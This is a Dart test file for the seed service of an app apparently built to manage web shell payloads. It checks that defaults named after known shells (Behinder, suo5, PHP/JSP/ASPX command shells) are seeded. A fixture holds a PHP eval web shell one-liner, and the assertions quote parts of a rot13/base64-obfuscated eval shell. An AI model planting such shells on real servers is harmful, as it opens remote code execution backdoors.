import 'package:flutter_test/flutter_test.dart';
import 'package:matrix/database/database_helper.dart';
import 'package:matrix/models/payload.dart';
import 'package:matrix/services/seed_service.dart';

class _MemoryDb implements DatabaseHelper {
  final Map<String, String> _meta = {};
  final List<Payload> _payloads = [];
  int _nextId = 1;

  @override
  Future<String?> getMetaValue(String key) async => _meta[key];

  @override
  Future<void> setMetaValue(String key, String value) async {
    _meta[key] = value;
  }

  @override
  Future<List<Payload>> getAllPayloads() async => List<Payload>.from(_payloads);

  @override
  Future<Payload> createPayload({
    required String name,
    required String type,
    required String content,
    bool isDefault = false,
    String? description,
    String? tags,
  }) async {
    final now = DateTime.now();
    final payload = Payload(
      id: _nextId++,
      name: name,
      type: type,
      content: content,
      isDefault: isDefault,
      description: description,
      tags: tags,
      createdAt: now,
      updatedAt: now,
    );
    _payloads.add(payload);
    return payload;
  }

  @override
  Future<int> updatePayload(Payload payload) async {
    final idx = _payloads.indexWhere((p) => p.id == payload.id);
    if (idx < 0) return 0;
    _payloads[idx] = payload;
    return 1;
  }

  @override
  Future<int> deletePayload(int id) async {
    final before = _payloads.length;
    _payloads.removeWhere((p) => p.id == id);
    return before - _payloads.length;
  }

  @override
  dynamic noSuchMethod(Invocation invocation) => super.noSuchMethod(invocation);

  void seedExisting(Payload payload) {
    _payloads.add(payload);
    if (payload.id >= _nextId) _nextId = payload.id + 1;
  }
}

void main() {
  TestWidgetsFlutterBinding.ensureInitialized();

  group('SeedService', () {
    test(
      'first seed inserts defaults and writes current seed version',
      () async {
        final db = _MemoryDb();

        await SeedService.seed(db);

        final payloads = await db.getAllPayloads();
        expect(payloads, isNotEmpty);
        expect(payloads.length, equals(28));
        expect(payloads.map((p) => p.name), contains('php_eval_post.php'));
        expect(payloads.map((p) => p.name), contains('jsp_behinder.jsp'));
        expect(payloads.map((p) => p.name), contains('aspx_cmd_post.aspx'));
        expect(payloads.map((p) => p.name), contains('suo5.php'));
        expect(payloads.map((p) => p.name), contains('suo5.jsp'));
        expect(payloads.map((p) => p.name), contains('suo5.aspx'));
        expect(payloads.map((p) => p.name), contains('suo6.jsp'));
        expect(await db.getMetaValue('seed_version'), equals('12'));
      },
    );

    test('seed is idempotent and does not create duplicate payloads', () async {
      final db = _MemoryDb();

      await SeedService.seed(db);
      final first = await db.getAllPayloads();

      await SeedService.seed(db);
      final second = await db.getAllPayloads();

      expect(second.length, equals(first.length));
      expect(second.map((p) => p.name).toSet().length, equals(second.length));
    });

    test(
      'seed patch renames legacy payload and repairs b64rot13 content',
      () async {
        final now = DateTime.now();
        final db = _MemoryDb();
        db.seedExisting(
          Payload(
            id: 1,
            name: 'php_simple.php',
            type: 'php',
            content: r'<?php @eval($_POST["cmd"]);',
            isDefault: true,
            createdAt: now,
            updatedAt: now,
          ),
        );
        db.seedExisting(
          Payload(
            id: 2,
            name: 'php_b64rot13_post.php',
            type: 'php',
            content: '<?php // broken old content',
            isDefault: true,
            createdAt: now,
            updatedAt: now,
          ),
        );

        await SeedService.seed(db);
        final payloads = await db.getAllPayloads();

        expect(payloads.map((p) => p.name), contains('php_eval_post.php'));

        final b64 = payloads.firstWhere(
          (p) => p.name == 'php_b64rot13_post.php',
        );
        expect(b64.content, contains(r"$f = str_rot13('onfr64_qrpbqr');"));
        expect(b64.content, contains(r"$q = $f($_POST['mAtrix_911']);"));
        expect(b64.content, contains('@eval(\$q);'));
      },
    );

    test(
      'purges default payloads no longer in built-in list; keeps user payloads',
      () async {
        final now = DateTime.now();
        final db = _MemoryDb();
        db.seedExisting(
          Payload(
            id: 9001,
            name: 'legacy_default_removed.jsp',
            type: 'jsp',
            content: '// obsolete',
            isDefault: true,
            createdAt: now,
            updatedAt: now,
          ),
        );
        db.seedExisting(
          Payload(
            id: 9002,
            name: 'user_custom.jsp',
            type: 'jsp',
            content: '// user',
            isDefault: false,
            createdAt: now,
            updatedAt: now,
          ),
        );

        await SeedService.seed(db);
        final payloads = await db.getAllPayloads();

        expect(
          payloads.map((p) => p.name),
          isNot(contains('legacy_default_removed.jsp')),
        );
        expect(payloads.map((p) => p.name), contains('user_custom.jsp'));
      },
    );
  });
}
